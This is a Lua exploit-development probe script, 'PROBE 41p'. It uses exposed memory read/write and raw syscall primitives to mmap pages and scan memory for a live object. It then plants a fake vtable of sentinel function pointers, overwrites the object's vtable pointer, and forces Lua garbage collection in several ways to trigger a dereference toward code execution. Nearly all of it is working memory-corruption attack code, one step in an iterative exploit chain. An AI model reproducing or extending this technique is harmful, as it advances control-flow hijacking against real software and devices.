-- CRASH_CLASS: RISKY (vtable redirect + GC trigger)
-- PROBE 41p: redirect vtable then force Lua GC to dereference it
-- From 41o: vtable overwrite works, but syscalls don't trigger deref
-- Hypothesis: objects are Lua-managed, GC sweep reads the vtable
-- Plan:
--   1. Find live object with hi=1 vtable pattern
--   2. Build fake vtable in our mmap page
--   3. Overwrite vtable pointer
--   4. Force GC via collectgarbage() and massive allocation pressure
--   5. Check if fake vtable was read or if we crash (= code exec)
-- OUTPUT STRATEGY: flush every line immediately so we capture
-- as much as possible before a crash

print("=== PROBE 41p: GC VTABLE TRIGGER ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function dump_qword(val)
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", val.h, val.l)
    end
    return string.format("%016X", to_num(val))
end
local function hex(n)
    if type(n) == "table" and n.h then
        return string.format("0x%08X%08X", n.h, n.l)
    end
    return string.format("0x%X", tonumber(n) or 0)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, lo, hi)
    safe_wd(addr, lo)
    safe_wd(addr + 4, hi)
end

local sc_mmap   = make_syscall(477)
local sc_munmap = make_syscall(588)
local PAGE = 0x4000

local function do_mmap(sz)
    local ok, ret = pcall(function()
        return sc_mmap(uint64(0), uint64(sz), uint64(0x33),
            uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
    end)
    if not ok then return nil end
    local addr = to_num(ret)
    if addr == 0 or addr >= 0xFFFFFFFF00000000 then return nil end
    return addr
end

--------------------------------------------------------------------
-- STEP 1: Setup
--------------------------------------------------------------------
local anchor = do_mmap(PAGE)
if not anchor then print("anchor FAILED"); return end
local fake_vt = do_mmap(PAGE)
if not fake_vt then print("fake_vt FAILED"); return end
print("anchor=" .. hex(anchor) .. " fake_vt=" .. hex(fake_vt))

--------------------------------------------------------------------
-- STEP 2: Find victim with hi=1 vtable
--------------------------------------------------------------------
print("--- FIND VICTIM ---")
local victim = nil
local orig_hi, orig_lo = 0, 0

for i = 1, 384 do
    local pg = anchor - i * 0x1000
    if pg <= 0 then break end
    local d = safe_rd(pg)
    if d == nil then break end
    if d ~= 0 and d ~= 0xAFAFAFAF then
        for off = 0, 0xF00, 0x10 do
            local q = safe_rq(uint64(pg + off))
            if q then
                local h, l = get_hi_lo(q)
                if h == 1 and l > 0x01000000 then
                    victim = pg + off
                    orig_hi = h
                    orig_lo = l
                    break
                end
            end
        end
    end
    if victim then break end
end

if not victim then
    print("NO VICTIM")
    pcall(function() sc_munmap(uint64(anchor), uint64(PAGE)) end)
    pcall(function() sc_munmap(uint64(fake_vt), uint64(PAGE)) end)
    return
end
print("victim=" .. hex(victim) .. " vtable=" .. string.format("%08X_%08X", orig_hi, orig_lo))

-- snapshot victim
print("victim dump:")
for off = 0, 0x78, 8 do
    local q = safe_rq(uint64(victim + off))
    if q then
        local h, l = get_hi_lo(q)
        if h ~= 0 or l ~= 0 then
            print(string.format("  +%02X: %s", off, dump_qword(q)))
        end
    end
end
print("")

--------------------------------------------------------------------
-- STEP 3: Build fake vtable with sentinel markers
-- Use unique dwords per slot so crash PC tells us which slot
--------------------------------------------------------------------
print("--- BUILD FAKE VTABLE ---")
for slot = 0, 31 do
    local off = slot * 8
    -- each entry: 0x41410000 + slot as a 32-bit "function pointer"
    -- if called, crash PC = 0x4141xxxx (recognizable, in low unmapped range)
    local fptr = 0x41410000 + slot * 0x10
    safe_wq(fake_vt + off, fptr, 0)
end
-- verify first entries
for off = 0, 0x38, 8 do
    local q = safe_rq(fake_vt + off)
    print(string.format("  [+%02X] %s", off, q and dump_qword(q) or "?"))
end
print("")

--------------------------------------------------------------------
-- STEP 4: Overwrite vtable
--------------------------------------------------------------------
print("--- REDIRECT ---")
-- fake_vt address: need to split into hi/lo 32-bit parts
local fvt_lo = fake_vt % 0x100000000
local fvt_hi = math.floor(fake_vt / 0x100000000)
safe_wq(victim, fvt_lo, fvt_hi)
local check = safe_rq(uint64(victim))
print("victim+00=" .. (check and dump_qword(check) or "FAULT"))
print("")

--------------------------------------------------------------------
-- STEP 5: Trigger GC
-- Lua 5.1 collectgarbage modes: "collect", "stop", "restart",
-- "count", "step", "setpause", "setstepmul"
--------------------------------------------------------------------
print("--- GC TRIGGERS ---")

-- 5a: direct full GC cycle
print("5a: collectgarbage('collect')")
local ok_gc, err_gc = pcall(collectgarbage, "collect")
print("  result: ok=" .. tostring(ok_gc) .. " err=" .. tostring(err_gc))

-- check fake vtable
local vt_after_gc = safe_rq(fake_vt)
print("  vt[0]=" .. (vt_after_gc and dump_qword(vt_after_gc) or "FAULT"))

-- 5b: aggressive step GC
print("5b: step GC x10")
for i = 1, 10 do
    pcall(collectgarbage, "step", 1000)
end
vt_after_gc = safe_rq(fake_vt)
print("  vt[0]=" .. (vt_after_gc and dump_qword(vt_after_gc) or "FAULT"))

-- 5c: allocation pressure — create lots of tables to force GC
print("5c: allocation pressure (1000 tables)")
local pressure = {}
for i = 1, 1000 do
    pressure[i] = {a = i, b = tostring(i), c = {i, i+1, i+2}}
end
pcall(collectgarbage, "collect")
vt_after_gc = safe_rq(fake_vt)
print("  vt[0]=" .. (vt_after_gc and dump_qword(vt_after_gc) or "FAULT"))

-- 5d: free them all and GC
print("5d: free + GC")
pressure = nil
pcall(collectgarbage, "collect")
pcall(collectgarbage, "collect")
vt_after_gc = safe_rq(fake_vt)
print("  vt[0]=" .. (vt_after_gc and dump_qword(vt_after_gc) or "FAULT"))

-- 5e: string pressure (strings are interned, GC sweeps them)
print("5e: string pressure")
local strings = {}
for i = 1, 500 do
    strings[i] = string.rep(tostring(i), 100)
end
strings = nil
pcall(collectgarbage, "collect")
vt_after_gc = safe_rq(fake_vt)
print("  vt[0]=" .. (vt_after_gc and dump_qword(vt_after_gc) or "FAULT"))

-- 5f: userdata pressure (might use the vtable for __gc)
print("5f: userdata via memory.alloc")
local uds = {}
for i = 1, 100 do
    uds[i] = memory.alloc(256)
end
uds = nil
pcall(collectgarbage, "collect")
vt_after_gc = safe_rq(fake_vt)
print("  vt[0]=" .. (vt_after_gc and dump_qword(vt_after_gc) or "FAULT"))

-- 5g: coroutine creation + death (complex GC objects)
print("5g: coroutine pressure")
for i = 1, 50 do
    local co = coroutine.create(function()
        local t = {}
        for j = 1, 100 do t[j] = j end
        coroutine.yield(t)
    end)
    coroutine.resume(co)
    -- don't finish it, let it die
end
pcall(collectgarbage, "collect")
vt_after_gc = safe_rq(fake_vt)
print("  vt[0]=" .. (vt_after_gc and dump_qword(vt_after_gc) or "FAULT"))

-- 5h: setpause(0) + setstepmul(10000) for super aggressive GC
print("5h: aggressive GC config")
pcall(collectgarbage, "setpause", 0)
pcall(collectgarbage, "setstepmul", 10000)
-- now any alloc should trigger GC
for i = 1, 200 do
    local t = {a=1, b=2, c=3}
end
pcall(collectgarbage, "collect")
vt_after_gc = safe_rq(fake_vt)
print("  vt[0]=" .. (vt_after_gc and dump_qword(vt_after_gc) or "FAULT"))
-- restore normal GC
pcall(collectgarbage, "setpause", 200)
pcall(collectgarbage, "setstepmul", 200)

print("")

--------------------------------------------------------------------
-- STEP 6: Check if victim object was touched during GC
--------------------------------------------------------------------
print("--- VICTIM STATE ---")
local final = safe_rq(uint64(victim))
if final then
    local fh, fl = get_hi_lo(final)
    print("victim+00: " .. dump_qword(final))
    if fl == fvt_lo and fh == fvt_hi then
        print("still points to fake vtable (GC did not deref via +00)")
    else
        print("*** CHANGED! something accessed it ***")
    end
else
    print("victim FAULT — freed by GC!")
end

-- check all fake vtable slots for changes
print("fake vtable check:")
local any_changed = false
for slot = 0, 15 do
    local q = safe_rq(fake_vt + slot * 8)
    if q then
        local h, l = get_hi_lo(q)
        local expected = 0x41410000 + slot * 0x10
        if l ~= expected or h ~= 0 then
            print(string.format("  [+%02X] %s CHANGED (was %08X)", slot*8, dump_qword(q), expected))
            any_changed = true
        end
    else
        print(string.format("  [+%02X] FAULT", slot*8))
        any_changed = true
    end
end
if not any_changed then
    print("  all slots intact — vtable was NOT dereferenced by GC")
end
print("")

--------------------------------------------------------------------
-- STEP 7: Restore + cleanup
--------------------------------------------------------------------
print("--- RESTORE ---")
if safe_rq(uint64(victim)) then
    safe_wq(victim, orig_lo, orig_hi)
    local r = safe_rq(uint64(victim))
    print("restored: " .. (r and dump_qword(r) or "FAULT"))
else
    print("victim gone, nothing to restore")
end

pcall(function() sc_munmap(uint64(anchor), uint64(PAGE)) end)
pcall(function() sc_munmap(uint64(fake_vt), uint64(PAGE)) end)
print("=== PROBE 41p COMPLETE ===")
